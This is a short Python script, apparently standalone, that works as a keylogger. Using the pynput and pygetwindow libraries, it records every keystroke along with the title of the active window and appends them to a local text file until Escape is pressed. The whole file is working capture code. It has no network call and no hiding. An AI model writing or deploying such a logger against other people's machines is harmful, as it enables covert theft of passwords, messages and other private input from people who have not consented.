import os
import pygetwindow as gw
from pynput import keyboard


def log_keystroke(key, window):
    with open("keystrokes_log.txt", "a") as f:
        f.write(f"Key: {key} | Window: {window}\n")


def on_press(key):
    try:
        window = gw.get_active_window().title
        log_keystroke(key, window)
    except Exception as e:
        print(f"Error: {e}")


def on_release(key):
    if key == keyboard.Key.esc:
        return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()